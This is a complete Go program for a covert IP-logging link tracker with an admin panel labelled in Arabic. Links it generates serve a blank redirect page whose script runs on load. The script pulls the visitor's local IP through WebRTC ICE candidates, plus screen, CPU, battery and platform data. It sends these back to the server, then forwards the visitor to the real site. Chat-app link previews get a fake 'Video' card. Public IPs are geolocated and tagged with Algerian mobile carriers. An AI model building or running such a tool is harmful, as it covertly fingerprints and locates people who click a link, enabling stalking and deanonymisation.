package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

var db *sql.DB

type Capture struct {
	ID            int
	Code          string
	PublicIP      string
	LocalIP       string
	LocalIPSource string
	Port          string
	Location      string
	DeviceInfo    string
	CreatedAt     string
}

type PageData struct {
	GeneratedLink string
	Captures      []Capture
}

// ---------------------------------------------------------------------------
// Database
// ---------------------------------------------------------------------------

func initDB() {
	var err error
	db, err = sql.Open("sqlite", "./long_term_tracker.db")
	if err != nil {
		panic(err)
	}

	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(25)
	db.SetConnMaxLifetime(5 * time.Minute)

	// WAL mode for better concurrency
	db.Exec("PRAGMA journal_mode=WAL;")
	db.Exec("PRAGMA synchronous=NORMAL;")

	createTablesSQL := `
	CREATE TABLE IF NOT EXISTS links (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT UNIQUE,
		target_url TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE TABLE IF NOT EXISTS captures (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT,
		public_ip TEXT,
		local_ip TEXT,
		local_ip_source TEXT DEFAULT 'none',
		port TEXT,
		location TEXT,
		device_info TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE INDEX IF NOT EXISTS idx_captures_code ON captures(code);
	CREATE INDEX IF NOT EXISTS idx_captures_created ON captures(created_at);
	`
	if _, err = db.Exec(createTablesSQL); err != nil {
		panic(err)
	}

	// Migration: add local_ip_source to older DBs. Fails silently if it exists.
	db.Exec("ALTER TABLE captures ADD COLUMN local_ip_source TEXT DEFAULT 'none'")
}

// ---------------------------------------------------------------------------
// IP resolution helpers
// ---------------------------------------------------------------------------

func isTrustedPeer(ip net.IP) bool {
	return ip.IsLoopback() || ip.IsPrivate()
}

func isPrivateIP(ip net.IP) bool {
	return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast()
}

// getRealIP returns the client's public IP, taking X-Forwarded-For into
// account only when the request comes from a trusted proxy (loopback or
// private network). Prevents header spoofing from direct internet clients.
func getRealIP(r *http.Request) string {
	ip := r.RemoteAddr
	if host, _, err := net.SplitHostPort(ip); err == nil {
		ip = host
	}

	peer := net.ParseIP(ip)
	if peer == nil || !isTrustedPeer(peer) {
		return ip
	}

	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded == "" {
		forwarded = r.Header.Get("X-Real-IP")
	}
	if forwarded != "" {
		parts := strings.Split(forwarded, ",")
		for _, p := range parts {
			candidate := strings.TrimSpace(p)
			if parsed := net.ParseIP(candidate); parsed != nil && !isPrivateIP(parsed) {
				return candidate
			}
		}
		return strings.TrimSpace(parts[0])
	}
	return ip
}

func getISPAndLocation(ip string, ua string) string {
	if ip == "127.0.0.1" || ip == "::1" || strings.HasPrefix(ip, "192.168.") {
		return "Local Network"
	}

	lowerUA := strings.ToLower(ua)
	if strings.Contains(lowerUA, "telegram") {
		return "Telegram Bot"
	}
	if strings.Contains(lowerUA, "whatsapp") {
		return "WhatsApp Bot"
	}
	if strings.Contains(lowerUA, "facebookexternalhit") || strings.Contains(lowerUA, "messenger") {
		return "Meta Bot"
	}

	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,isp,org", ip))
	if err != nil {
		return "Algeria (Trace)"
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	json.Unmarshal(body, &result)

	if status, ok := result["status"].(string); ok && status == "success" {
		city, _ := result["city"].(string)
		country, _ := result["country"].(string)
		if country == "" {
			country = "Algeria"
		}
		isp, _ := result["isp"].(string)
		if isp == "" {
			isp, _ = result["org"].(string)
		}

		lowerISP := strings.ToLower(isp)
		networkType := fmt.Sprintf(" [%s]", isp)
		if strings.Contains(lowerISP, "mobilis") {
			networkType = " [⚡ Mobilis]"
		} else if strings.Contains(lowerISP, "djezzy") || strings.Contains(lowerISP, "ota") {
			networkType = " [🔥 Djezzy]"
		} else if strings.Contains(lowerISP, "ooredoo") || strings.Contains(lowerISP, "wataniya") {
			networkType = " [⭐ Ooredoo]"
		} else if strings.Contains(lowerISP, "algerie telecom") || strings.Contains(lowerISP, "atm") {
			networkType = " [🌐 Algérie Télécom]"
		}

		locStr := country
		if city != "" {
			locStr = city + ", " + country
		}
		return locStr + networkType
	}
	return "Algeria (Trace)"
}

// ---------------------------------------------------------------------------
// Redirect page (served when someone opens a tracking link)
// ---------------------------------------------------------------------------

const redirectPageTemplate = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<script>
async function extractAndRedirect() {
    let screenRes = window.screen.width + "x" + window.screen.height;
    let cores = navigator.hardwareConcurrency || "N/A";
    let platform = navigator.platform || "N/A";
    let batteryInfo = "N/A";

    try {
        if (navigator.getBattery) {
            let b = await navigator.getBattery();
            batteryInfo = Math.round(b.level * 100) + "%";
        }
    } catch (e) { }

    function collectICECandidates(timeoutMs) {
        return new Promise((resolve) => {
            const candidates = [];
            const seen = new Set();
            let pc = null;

            function finish() {
                try { if (pc) pc.close(); } catch (e) { }
                resolve(candidates);
            }

            try {
                pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: "stun:stun.l.google.com:19302" },
                        { urls: "stun:stun1.l.google.com:19302" },
                        { urls: "stun:stun.cloudflare.com:3478" }
                    ]
                });

                pc.createDataChannel("probe");

                pc.onicecandidate = (event) => {
                    if (!event.candidate || !event.candidate.candidate) return;

                    const raw = event.candidate.candidate;
                    if (seen.has(raw)) return;
                    seen.add(raw);

                    const parts = raw.split(" ");
                    const ip = parts[4];
                    const typ = parts[7];

                    if (!ip) return;

                    let source = "unknown";
                    if (typ === "srflx") {
                        source = "srflx";
                    } else if (typ === "relay") {
                        source = "relay";
                    } else if (typ === "host") {
                        if (ip.endsWith(".local")) {
                            source = "mdns";
                        } else {
                            source = "host";
                        }
                    }

                    candidates.push({ ip: ip, typ: typ, source: source });
                };

                pc.createOffer()
                    .then(o => pc.setLocalDescription(o))
                    .catch(() => { });

                const started = Date.now();
                const check = setInterval(() => {
                    if (pc.iceGatheringState === "complete" || Date.now() - started > timeoutMs) {
                        clearInterval(check);
                        finish();
                    }
                }, 80);

            } catch (e) {
                finish();
            }
        });
    }

    const allCandidates = await collectICECandidates(1200);

    let bestLocalIP = "Unknown";
    let localIPSource = "none";

    for (const c of allCandidates) {
        if (c.source === "host" && c.ip) {
            bestLocalIP = c.ip;
            localIPSource = "host";
            break;
        }
    }
    if (bestLocalIP === "Unknown") {
        for (const c of allCandidates) {
            if (c.source === "srflx" && c.ip) {
                bestLocalIP = c.ip;
                localIPSource = "srflx";
                break;
            }
        }
    }

    let params = new URLSearchParams();
    params.append("lip", bestLocalIP);
    params.append("lip_source", localIPSource);
    params.append("screen", screenRes);
    params.append("hardware", cores);
    params.append("battery", batteryInfo);
    params.append("platform", platform);
    params.append("ice_candidates", JSON.stringify(allCandidates.slice(0, 12)));

    try {
        if (navigator.sendBeacon) {
            navigator.sendBeacon(window.location.href, params);
        } else {
            await fetch(window.location.href, {
                method: "POST",
                body: params,
                keepalive: true
            });
        }
    } catch (e) { }

    setTimeout(() => {
        window.location.replace(##REDIRECT_TARGET##);
    }, 120);
}

window.addEventListener("DOMContentLoaded", extractAndRedirect);
</script>
</head>
<body style="background:#000;"></body>
</html>`

// ---------------------------------------------------------------------------
// Main handler
// ---------------------------------------------------------------------------

func mainHandler(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("r")

	// ----------------------------------------------------------------
	// Case 1: a visitor opened a tracking link (?r=CODE)
	// ----------------------------------------------------------------
	if code != "" {
		var targetURL string
		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
		if err != nil {
			http.Error(w, "Link not found", http.StatusNotFound)
			return
		}

		ua := r.UserAgent()
		isBot := strings.Contains(strings.ToLower(ua), "bot") ||
			strings.Contains(strings.ToLower(ua), "whatsapp") ||
			strings.Contains(strings.ToLower(ua), "telegram") ||
			strings.Contains(strings.ToLower(ua), "facebookexternalhit")

		// --- Bot handler (link previews) ---
		if isBot {
			publicIP := getRealIP(r)
			location := getISPAndLocation(publicIP, ua)
			safeUA := ua
			if len(safeUA) > 60 {
				safeUA = safeUA[:60]
			}
			db.Exec(
				"INSERT INTO captures (code, public_ip, local_ip, local_ip_source, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?, ?)",
				code, publicIP, "Bot", "none", "N/A", location, "🤖 [Bot] UA: "+safeUA,
			)

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprint(w, `<!DOCTYPE html><html><head><meta property="og:title" content="Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"></head><body></body></html>`)
			return
		}

		// --- Payload POST from the JS tracker ---
		if r.Method == http.MethodPost {
			r.ParseForm()

			publicIP := getRealIP(r)

			localIP := r.FormValue("lip")
			if localIP == "" {
				localIP = "Unknown"
			}

			localIPSource := r.FormValue("lip_source")
			if localIPSource == "" {
				localIPSource = "none"
			}

			port := "N/A"
			if _, p, err := net.SplitHostPort(r.RemoteAddr); err == nil {
				port = p
			}

			location := getISPAndLocation(publicIP, ua)

			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s",
				r.FormValue("platform"),
				r.FormValue("screen"),
				r.FormValue("hardware"),
				r.FormValue("battery"),
			)

			// Log raw ICE candidates to stdout (useful for debugging leaks)
			if rawCandidates := r.FormValue("ice_candidates"); rawCandidates != "" {
				fmt.Printf("[ICE] code=%s public=%s local=%s(%s) candidates=%s\n",
					code, publicIP, localIP, localIPSource, rawCandidates)
			}

			db.Exec(
				"INSERT INTO captures (code, public_ip, local_ip, local_ip_source, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?, ?)",
				code, publicIP, localIP, localIPSource, port, location, deviceInfo,
			)

			w.WriteHeader(http.StatusOK)
			w.Write([]byte("OK"))
			return
		}

		// --- Serve the tracker HTML (GET) ---
		targetJSON, _ := json.Marshal(targetURL)
		htmlContent := strings.ReplaceAll(redirectPageTemplate, "##REDIRECT_TARGET##", string(targetJSON))

		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
		w.Write([]byte(htmlContent))
		return
	}

	// ----------------------------------------------------------------
	// Case 2: admin panel (no ?r= code)
	// ----------------------------------------------------------------
	var generatedLink string
	if r.Method == http.MethodPost {
		r.ParseForm()
		targetURL := r.FormValue("target_url")
		customCode := r.FormValue("custom_code")

		if targetURL != "" {
			if !strings.HasPrefix(targetURL, "http") {
				targetURL = "https://" + targetURL
			}

			codeGen := customCode
			if codeGen == "" {
				codeGen = fmt.Sprintf("%d", time.Now().UnixNano())[8:]
			}

			_, err := db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)
			if err == nil {
				scheme := "https"
				if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
					scheme = "http"
				}
				generatedLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, codeGen)
			}
		}
	}

	rows, err := db.Query("SELECT id, code, public_ip, local_ip, local_ip_source, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT 50")
	if err != nil {
		http.Error(w, "DB error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var captures []Capture
	for rows.Next() {
		var c Capture
		if err := rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.LocalIPSource, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt); err != nil {
			continue
		}
		captures = append(captures, c)
	}

	data := PageData{
		GeneratedLink: generatedLink,
		Captures:      captures,
	}

	tmpl := `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code Terminal - Intelligence</title>
    <style>
        body {
            background-color: #0d1117;
            background-image: radial-gradient(rgba(0, 255, 128, 0.05) 1px, transparent 1px);
            background-size: 24px 24px;
            color: #c9d1d9;
            font-family: 'Courier New', Courier, monospace;
            padding: 10px;
            margin: 0;
        }
        .box {
            background: #161b22;
            border: 1px solid #30363d;
            padding: 14px;
            border-radius: 6px;
            margin-bottom: 15px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #58a6ff;
            border-radius: 4px;
            margin-bottom: 10px;
            font-size: 13px;
            font-family: 'Courier New', Courier, monospace;
            box-sizing: border-box;
        }
        input[type="text"]:focus {
            border-color: #58a6ff;
            outline: none;
            box-shadow: 0 0 5px rgba(88, 166, 255, 0.4);
        }
        button {
            background: #238636;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            font-size: 13px;
            font-family: 'Courier New', Courier, monospace;
        }
        button:hover { background: #2ea043; }
        .result {
            background: #0d1117;
            border: 1px solid #238636;
            padding: 10px;
            border-radius: 4px;
            margin-top: 10px;
            word-break: break-all;
        }
        .copy-btn {
            background: #1f6feb;
            margin-top: 8px;
            padding: 6px;
            font-size: 11px;
        }
        .copy-btn:hover { background: #388bfd; }
        .table-wrap { width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; }
        table { width: 100%; min-width: 700px; border-collapse: collapse; margin-top: 8px; font-size: 11px; font-family: 'Courier New', Courier, monospace; }
        th, td { border: 1px solid #30363d; padding: 6px; text-align: center; white-space: nowrap; }
        th { background: #21262d; color: #8b949e; }
        .src-host  { color: #3fb950; }
        .src-srflx { color: #d29922; }
        .src-mdns  { color: #8b949e; }
        .src-none  { color: #6e7681; }
    </style>
    <script>
        function copyLink() {
            var linkText = document.getElementById("genLink").innerText;
            navigator.clipboard.writeText(linkText).then(function() {
                alert("تم نسخ الرابط البرمجي بنجاح!");
            });
        }
    </script>
</head>
<body>
    <div class="box">
        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [SYSTEM] - توليد رابط تتبع بررمز مخصص</h3>
        <form method="POST">
            <input type="text" name="target_url" placeholder="target_url (tiktok.com/...)" required autocomplete="off">
            <input type="text" name="custom_code" placeholder="custom_tracking_code (optional)" autocomplete="off">
            <button type="submit">generate_link()</button>
        </form>
        {{if .GeneratedLink}}
        <div class="result">
            <span style="font-size:11px; color:#3fb950; font-weight:bold;">Active Link:</span><br>
            <span id="genLink" style="color: #58a6ff; font-size: 12px;">{{.GeneratedLink}}</span>
            <button type="button" class="copy-btn" onclick="copyLink()">copy_to_clipboard</button>
        </div>
        {{end}}
    </div>

    <div class="box">
        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [DATABASE] - سجلات الاستخبارات</h3>
        <div class="table-wrap">
            <table>
                <tr>
                    <th>ID</th>
                    <th>Code</th>
                    <th>Public IP</th>
                    <th>Local IP</th>
                    <th>Source</th>
                    <th>ISP / Network</th>
                    <th>Hardware &amp; OS</th>
                    <th>Timestamp</th>
                </tr>
                {{range .Captures}}
                <tr>
                    <td>{{.ID}}</td>
                    <td style="color:#58a6ff; font-weight:bold;">{{.Code}}</td>
                    <td style="color:#7ee787;">{{.PublicIP}}</td>
                    <td style="color:#d29922;">{{.LocalIP}}</td>
                    <td class="src-{{.LocalIPSource}}">{{.LocalIPSource}}</td>
                    <td style="color:#3fb950;">{{.Location}}</td>
                    <td style="color:#ff7b72;">{{.DeviceInfo}}</td>
                    <td style="color:#8b949e;">{{.CreatedAt}}</td>
                </tr>
                {{end}}
            </table>
        </div>
    </div>
</body>
</html>`

	t, err := template.New("index").Parse(tmpl)
	if err != nil {
		http.Error(w, "template error", http.StatusInternalServerError)
		return
	}
	t.Execute(w, data)
}

func main() {
	initDB()
	http.HandleFunc("/", mainHandler)
	fmt.Println("[*] Terminal Server running on port 8080...")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		panic(err)
	}
}
